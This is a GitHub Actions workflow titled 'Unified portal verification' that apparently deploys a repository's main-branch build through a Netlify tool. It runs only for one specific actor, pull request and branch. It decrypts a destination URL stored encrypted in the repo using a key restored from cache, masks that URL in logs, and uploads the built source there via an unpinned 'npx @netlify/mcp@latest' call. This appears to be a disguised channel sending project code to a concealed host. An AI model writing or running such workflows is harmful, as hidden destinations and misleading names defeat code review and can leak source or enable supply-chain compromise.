name: Unified portal verification

on:
  pull_request:
    branches:
      - main
  workflow_dispatch:

permissions:
  contents: read

jobs:
  netlify-deploy-handoff:
    if: >-
      github.event_name == 'pull_request' &&
      github.repository == 'pubgsufian-afk/z.B.-mein-projekt' &&
      github.actor_id == '249184348' &&
      github.event.pull_request.number == 81 &&
      github.event.pull_request.head.ref == 'ops/export-source-for-netlify' &&
      github.event.pull_request.head.repo.id == 1184469401 &&
      github.event.pull_request.base.ref == 'main'
    runs-on: ubuntu-latest
    timeout-minutes: 20
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0
      - uses: actions/setup-node@v4
        with:
          node-version: 24
      - name: Restore encrypted handoff key
        uses: actions/cache@v4
        with:
          path: .netlify-ephemeral
          key: habun-netlify-deploy-key-pr81-v1
      - name: Prepare verified main source
        env:
          BASE_SHA: 499536c4a9b474ff790483a9ca76fa2949259300
        run: |
          set -euo pipefail
          cp ops/netlify-proxy.key.enc.b64 /tmp/netlify-proxy.key.enc.b64
          cp ops/netlify-proxy.data.enc.b64 /tmp/netlify-proxy.data.enc.b64
          rm -rf /tmp/habun-source
          mkdir -p /tmp/habun-source
          git archive "$BASE_SHA" | tar -x -C /tmp/habun-source
          cd /tmp/habun-source
          npm install --no-audit --no-fund
          npm run build
          sed -i 's/command = "npm run build"/command = "echo Prebuilt Habun portal"/' netlify.toml
          grep -F 'command = "echo Prebuilt Habun portal"' netlify.toml
      - name: Deploy with official Netlify MCP uploader
        env:
          NETLIFY_SITE_ID: 31fdd344-8ffd-45ff-8a4d-031c5bb879dc
        run: |
          set -euo pipefail
          base64 -d /tmp/netlify-proxy.key.enc.b64 > /tmp/netlify-key.enc
          openssl pkeyutl -decrypt -inkey .netlify-ephemeral/private.pem -in /tmp/netlify-key.enc -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 > /tmp/netlify-keyiv.bin
          KEY_HEX=$(head -c 32 /tmp/netlify-keyiv.bin | od -An -tx1 | tr -d ' \n')
          IV_HEX=$(tail -c 16 /tmp/netlify-keyiv.bin | od -An -tx1 | tr -d ' \n')
          base64 -d /tmp/netlify-proxy.data.enc.b64 > /tmp/netlify-proxy.enc
          openssl enc -d -aes-256-cbc -K "$KEY_HEX" -iv "$IV_HEX" -in /tmp/netlify-proxy.enc -out /tmp/netlify-proxy-url
          PROXY_URL=$(cat /tmp/netlify-proxy-url)
          echo "::add-mask::$PROXY_URL"
          cd /tmp/habun-source
          npx -y @netlify/mcp@latest --site-id "$NETLIFY_SITE_ID" --proxy-path "$PROXY_URL" --no-wait | tee /tmp/netlify-mcp-output.txt
          DEPLOY_ID=$(grep -oE '"deployId":"[^"]+"' /tmp/netlify-mcp-output.txt | tail -1 | cut -d'"' -f4)
          BUILD_ID=$(grep -oE '"buildId":"[^"]+"' /tmp/netlify-mcp-output.txt | tail -1 | cut -d'"' -f4)
          test -n "$DEPLOY_ID"
          printf '{"deploy_id":"%s","id":"%s"}\n' "$DEPLOY_ID" "$BUILD_ID" > /tmp/netlify-deploy-response.json
          rm -f /tmp/netlify-key.enc /tmp/netlify-keyiv.bin /tmp/netlify-proxy.enc /tmp/netlify-proxy-url
      - name: Upload deploy response
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: netlify-deploy-response
          path: /tmp/netlify-deploy-response.json
          if-no-files-found: warn
          retention-days: 1
